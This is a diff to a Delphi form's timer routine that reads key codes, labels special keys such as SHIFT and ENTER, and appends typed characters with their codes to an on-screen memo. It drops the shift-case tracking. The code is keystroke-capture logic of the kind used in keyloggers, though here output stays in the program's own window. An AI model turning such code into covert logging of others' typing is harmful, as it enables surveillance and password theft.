@@ -48,7 +48,6 @@ end;
 procedure TForm1.Timer1Timer(Sender: TObject);
 var
 InputKey, KeyResult : Integer;
-Pressed: Bool;
 begin
 
 InputKey := 0;
@@ -64,7 +63,7 @@ begin
     9: DisplayAction(' [TAB] ');
     12: DisplayAction(' [ALT] ');
     13: DisplayAction(' [ENTER] ');
-    16: Pressed := True;  //DisplayAction(' [SHIFT] ');
+    16: DisplayAction(' [SHIFT] ');
     17: DisplayAction(' [CONTROL] ');
     18: DisplayAction(' [ALT] ');
     19: DisplayAction(' [BREAK] ');
@@ -134,8 +133,7 @@ begin
     226: DisplayAction(' < ');
   else if (InputKey >=32) and (InputKey <=110) AND (InputKey <> 64) then
   begin
-    if pressed then Memo1.Text := Memo1.Text + Uppercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey);
-    else Memo1.Text := Memo1.Text + Lowercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey);
+    Memo1.Text := Memo1.Text + Chr(InputKey) + ' TAG: ' + IntToStr(InputKey);
     Memo1.Lines.Add('');
   end
   else // Exception for all undefined keys
